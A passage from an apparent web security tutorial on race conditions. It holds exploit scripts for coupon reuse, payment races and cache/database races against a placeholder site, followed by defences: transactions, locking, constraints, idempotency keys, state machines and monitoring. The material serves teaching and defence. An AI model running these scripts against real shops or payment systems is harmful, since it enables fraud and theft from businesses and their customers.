     def execute_attack_chain():
         print("Starting attack chain...")
         
         # Step 1: Create account with verification bypass
         username = "raceuser" + str(int(time.time()))
         email = f"{username}@example.com"
         password = "Password123!"
         
         print(f"Creating account: {username}")
         session = create_account_with_bypass(username, email, password)
         
         # Step 2: Apply coupon code multiple times
         print("Exploiting coupon code...")
         applied = exploit_coupon_code(session, "DISCOUNT20")
         print(f"Applied coupon {applied} times")
         
         # Step 3: Exploit payment race condition
         print("Exploiting payment race condition...")
         order = exploit_payment_race(session, "10.00")
         print(f"Order status: {order.status_code}")
         print(f"Order details: {order.text[:200]}")
         
         print("Attack chain completed")
     
     # Run the attack
     execute_attack_chain()
     ```

  2. **Using delays to align race windows**:
     - Analyze the timing of request processing for different endpoints
     - Identify endpoints with significant processing time differences
     - Use client-side delays to align race windows
     - Implement precise timing control in exploitation scripts
     - Example Turbo Intruder script with timing control:
     ```python
     def queueRequests(target, wordlists):
         engine = RequestEngine(
             endpoint=target.endpoint,
             concurrentConnections=10,
             requestsPerConnection=1,
             pipeline=False
         )
         
         # Request that takes longer to process
         slow_req = '''POST /payment/process HTTP/2
     Host: vulnerable-website.com
     Content-Type: application/json
     Cookie: session=valid_session
     
     {"amount":"10.00","method":"credit_card","card":"4111111111111111","exp":"12/25","cvv":"123"}'''
         
         # Request that processes quickly
         fast_req = '''POST /cart/update HTTP/2
     Host: vulnerable-website.com
     Content-Type: application/json
     Cookie: session=valid_session
     
     {"items":[{"id":"expensive-item","quantity":10}]}'''
         
         # Function to send the slow request
         def send_slow():
             engine.queue(slow_req)
         
         # Function to send fast request after delay
         def send_fast():
             # Wait to align with processing window of slow request
             time.sleep(0.2)
             engine.queue(fast_req)
         
         # Start separate threads for timing control
         import threading
         
         slow_thread = threading.Thread(target=send_slow)
         fast_thread = threading.Thread(target=send_fast)
         
         slow_thread.start()
         fast_thread.start()
         
         slow_thread.join()
         fast_thread.join()
     
     def handleResponse(req, interesting):
         table.add(req)
     ```

  3. **Exploiting distributed systems**:
     - Identify applications with distributed backend components
     - Look for synchronization issues between distributed components
     - Target race conditions that exploit replication lag or caching
     - Design attacks that target inconsistencies in distributed state
     - Example attack targeting cache/database inconsistency:
     ```python
     import requests
     import threading
     import time
     
     def exploit_cache_db_race(base_url, username, password):
         # Create two sessions
         cache_session = requests.Session()
         db_session = requests.Session()
         
         # Login with both sessions
         cache_session.post(
             f"{base_url}/login",
             json={"username": username, "password": password}
         )
         
         db_session.post(
             f"{base_url}/login",
             json={"username": username, "password": password}
         )
         
         # Function to change password
         def change_password():
             response = db_session.post(
                 f"{base_url}/account/change-password",
                 json={
                     "current_password": password,
                     "new_password": "NewPassword123!"
                 }
             )
             return response
         
         # Function to add funds to account
         def add_funds():
             # This may read from cache while DB is being updated
             response = cache_session.post(
                 f"{base_url}/account/add-funds",
                 json={"amount": "1000.00"}
             )
             return response
         
         # Start password change (updates DB first, cache later)
         pwd_thread = threading.Thread(target=change_password)
         pwd_thread.start()
         
         # Small delay to ensure DB update has started
         time.sleep(0.1)
         
         # Add funds during the window between DB and cache update
         funds_thread = threading.Thread(target=add_funds)
         funds_thread.start()
         
         # Wait for both operations to complete
         pwd_thread.join()
         funds_thread.join()
         
         # Check account balance
         balance = cache_session.get(f"{base_url}/account/balance")
         print(f"Account balance response: {balance.status_code}")
         print(f"Balance details: {balance.text}")
         
         # Try to withdraw with both old and new password to verify exploit
         old_pwd_withdraw = db_session.post(
             f"{base_url}/account/withdraw",
             json={"amount": "500.00", "password": password}
         )
         
         new_pwd_withdraw = db_session.post(
             f"{base_url}/account/withdraw",
             json={"amount": "500.00", "password": "NewPassword123!"}
         )
         
         print(f"Withdraw with old password: {old_pwd_withdraw.status_code}")
         print(f"Withdraw with new password: {new_pwd_withdraw.status_code}")
     
     # Execute the exploit
     exploit_cache_db_race(
         "https://vulnerable-website.com",
         "test_user",
         "Password123!"
     )
     ```

- **Prevention and mitigation**
  1. **Implementing atomic operations**:
     - Use database transactions for related operations
     - Ensure all state changes within a critical operation are atomic
     - Implement proper locking mechanisms for shared resources
     - Use the database's consistency features like unique constraints
     - Example atomic implementation:
     ```php
     // PHP example with database transaction
     try {
         $db->beginTransaction();
         
         // Check if code has been used
         $stmt = $db->prepare("SELECT used FROM discount_codes WHERE code = ? FOR UPDATE");
         $stmt->execute([$discountCode]);
         $result = $stmt->fetch();
         
         if (!$result || $result['used']) {
             $db->rollBack();
             return "Code already used or invalid";
         }
         
         // Apply the discount
         applyDiscountToCart($cart, $discountAmount);
         
         // Mark code as used
         $updateStmt = $db->prepare("UPDATE discount_codes SET used = 1 WHERE code = ?");
         $updateStmt->execute([$discountCode]);
         
         $db->commit();
         return "Discount applied successfully";
     } catch (Exception $e) {
         $db->rollBack();
         return "Error applying discount: " . $e->getMessage();
     }
     ```

  2. **Implementing proper locking mechanisms**:
     - Use optimistic or pessimistic locking for critical operations
     - Implement row-level database locks for sensitive records
     - Use distributed locks for microservice architectures
     - Add version/timestamp checks to detect concurrent modifications
     - Example implementation with optimistic locking:
     ```java
     // Java example with optimistic locking
     @Transactional
     public void transferFunds(Long fromAccountId, Long toAccountId, BigDecimal amount) {
         Account fromAccount = accountRepository.findById(fromAccountId)
             .orElseThrow(() -> new AccountNotFoundException(fromAccountId));
         
         Account toAccount = accountRepository.findById(toAccountId)
             .orElseThrow(() -> new AccountNotFoundException(toAccountId));
         
         // Check balance
         if (fromAccount.getBalance().compareTo(amount) < 0) {
             throw new InsufficientFundsException(fromAccountId);
         }
         
         // Perform transfer
         fromAccount.setBalance(fromAccount.getBalance().subtract(amount));
         toAccount.setBalance(toAccount.getBalance().add(amount));
         
         // Save both accounts - if version has changed, this will throw an exception
         accountRepository.save(fromAccount);
         accountRepository.save(toAccount);
         
         // Create transaction record
         transactionRepository.save(new Transaction(fromAccount, toAccount, amount));
     }
     ```

  3. **Using database constraints**:
     - Implement unique constraints for resources that should only be used once
     - Use foreign key constraints to maintain referential integrity
     - Apply check constraints to enforce business rules
     - Use triggers to enforce complex integrity rules
     - Example SQL with constraints:
     ```sql
     -- SQL table with constraints to prevent race conditions
     CREATE TABLE discount_codes (
         id INT PRIMARY KEY AUTO_INCREMENT,
         code VARCHAR(50) UNIQUE NOT NULL,
         discount_amount DECIMAL(10,2) NOT NULL,
         used BOOLEAN DEFAULT FALSE,
         user_id INT NULL,
         used_at TIMESTAMP NULL,
         CONSTRAINT uc_code_user UNIQUE (code, user_id),
         CHECK (used = FALSE OR (used = TRUE AND user_id IS NOT NULL AND used_at IS NOT NULL))
     );
     
     -- SQL procedure with proper locking
     DELIMITER //
     CREATE PROCEDURE apply_discount_code(IN p_code VARCHAR(50), IN p_user_id INT)
     BEGIN
         DECLARE v_discount DECIMAL(10,2);
         
         START TRANSACTION;
         
         -- Lock the row for update
         SELECT discount_amount INTO v_discount
         FROM discount_codes
         WHERE code = p_code AND used = FALSE
         FOR UPDATE;
         
         IF v_discount IS NULL THEN
             ROLLBACK;
             SIGNAL SQLSTATE '45000' SET MESSAGE_TEXT = 'Invalid or already used code';
         ELSE
             -- Mark as used
             UPDATE discount_codes
             SET used = TRUE, user_id = p_user_id, used_at = NOW()
             WHERE code = p_code;
             
             -- Apply discount to user's cart (additional logic needed)
             
             COMMIT;
         END IF;
     END //
     DELIMITER ;
     ```

  4. **Implementing idempotent APIs**:
     - Design APIs to be idempotent (same result regardless of multiple identical calls)
     - Use unique request identifiers to detect and prevent duplicate processing
     - Implement response caching for repeat requests
     - Add client-side retry logic with exponential backoff
     - Example idempotent API implementation:
     ```javascript
     // Node.js example with idempotency keys
     app.post('/api/payments', async (req, res) => {
         try {
             const idempotencyKey = req.headers['idempotency-key'];
             
             if (!idempotencyKey) {
                 return res.status(400).json({ error: 'Idempotency key required' });
             }
             
             // Check if this request has already been processed
             const existingTransaction = await Transaction.findOne({ idempotencyKey });
             
             if (existingTransaction) {
                 // Return the same result as before
                 return res.status(200).json({
                     success: true,
                     transactionId: existingTransaction.id,
                     amount: existingTransaction.amount,
                     status: existingTransaction.status,
                     message: 'Transaction already processed'
                 });
             }
             
             // Process new payment
             const { amount, paymentMethod } = req.body;
             
             // Validation
             if (!amount || !paymentMethod) {
                 return res.status(400).json({ error: 'Invalid payment details' });
             }
             
             // Process payment (atomic operation)
             const transaction = await db.transaction(async (trx) => {
                 // Check balance, process payment, etc.
                 const result = await processPayment(amount, paymentMethod, trx);
                 
                 // Store the transaction with the idempotency key
                 const transaction = await Transaction.create({
                     idempotencyKey,
                     amount,
                     paymentMethod,
                     status: result.success ? 'completed' : 'failed',
                     userId: req.user.id
                 }, { transaction: trx });
                 
                 return transaction;
             });
             
             return res.status(200).json({
                 success: true,
                 transactionId: transaction.id,
                 amount: transaction.amount,
                 status: transaction.status
             });
             
         } catch (error) {
             console.error('Payment error:', error);
             return res.status(500).json({ error: 'Payment processing failed' });
         }
     });
     ```

  5. **Implementing server-side state management**:
     - Avoid storing critical state in client sessions
     - Use server-side session storage with proper locking
     - Implement state machines for complex workflows
     - Track and validate state transitions server-side
     - Example state machine implementation:
     ```python
     # Python example with state machine for checkout process
     class OrderStateMachine:
         STATES = {
             'CART': ['PAYMENT_PENDING'],
             'PAYMENT_PENDING': ['PAYMENT_COMPLETE', 'PAYMENT_FAILED'],
             'PAYMENT_COMPLETE': ['ORDER_CONFIRMED'],
             'PAYMENT_FAILED': ['CART'],
             'ORDER_CONFIRMED': ['SHIPPED', 'CANCELLED'],
             'SHIPPED': ['DELIVERED'],
             'DELIVERED': ['COMPLETED'],
             'CANCELLED': []
         }
         
         def __init__(self, db_session):
             self.db = db_session
         
         def transition(self, order_id, from_state, to_state):
             # Begin transaction
             with self.db.begin():
                 # Lock the order record
                 order = self.db.query(Order)\
                     .filter(Order.id == order_id)\
                     .with_for_update()\
                     .first()
                 
                 if not order:
                     raise ValueError(f"Order {order_id} not found")
                 
                 # Verify current state matches expected from_state
                 if order.state != from_state:
                     raise ValueError(f"Order {order_id} is in state {order.state}, not {from_state}")
                 
                 # Check if transition is valid
                 if to_state not in self.STATES[from_state]:
                     raise ValueError(f"Cannot transition from {from_state} to {to_state}")
                 
                 # Perform state-specific actions
                 if to_state == 'PAYMENT_PENDING':
                     # Lock cart for checkout
                     self._lock_cart(order.cart_id)
                 elif to_state == 'PAYMENT_COMPLETE':
                     # Validate payment and update inventory
                     self._validate_payment(order.payment_id)
                     self._update_inventory(order.items)
                 
                 # Update state
                 order.state = to_state
                 order.updated_at = datetime.now()
                 
                 # Create state change record for audit
                 state_change = OrderStateChange(
                     order_id=order.id,
                     from_state=from_state,
                     to_state=to_state,
                     changed_at=datetime.now()
                 )
                 self.db.add(state_change)
                 
                 # Commit transaction
                 self.db.commit()
                 
                 return order
         
         def _lock_cart(self, cart_id):
             # Lock cart to prevent further changes
             cart = self.db.query(Cart)\
                 .filter(Cart.id == cart_id)\
                 .with_for_update()\
                 .first()
             
             if not cart:
                 raise ValueError(f"Cart {cart_id} not found")
             
             cart.locked = True
         
         def _validate_payment(self, payment_id):
             # Validate payment - implement specific logic
             pass
         
         def _update_inventory(self, items):
             # Update inventory atomically - implement specific logic
             pass
     ```

  6. **Monitoring and alerting**:
     - Implement monitoring for unusual patterns of requests
     - Set up alerts for suspicious activity
     - Log and analyze concurrent operations on sensitive resources
     - Monitor for abnormal success rates of rate-limited operations
     - Example monitoring implementation:
     ```python
     # Python example with monitoring and alerting
     def apply_discount_code(user_id, code, request_metadata):
         # Record attempt
         attempt_id = record_discount_attempt(user_id, code, request_metadata)
         
         try:
             # Check for suspicious patterns
             recent_attempts = get_recent_attempts(user_id, seconds=5)
             if len(recent_attempts) > 3:
                 # Alert on potential race condition attack
                 alert_security("Potential race condition attack", {
                     "user_id": user_id,
                     "code": code,
                     "attempts": len(recent_attempts),
                     "ip_address": request_metadata.get("ip_address"),
                     "user_agent": request_metadata.get("user_agent")
                 })
                 
                 # Apply additional verification or delay
                 time.sleep(1)
             
             # Normal discount code logic with atomic operations
             with transaction.atomic():
                 # Rest of the code
                 pass
                 
             # Record success
             update_attempt_status(attempt_id, "success")
             
         except Exception as e:
             # Record failure
             update_attempt_status(attempt_id, "failure", str(e))
             raise
     ```
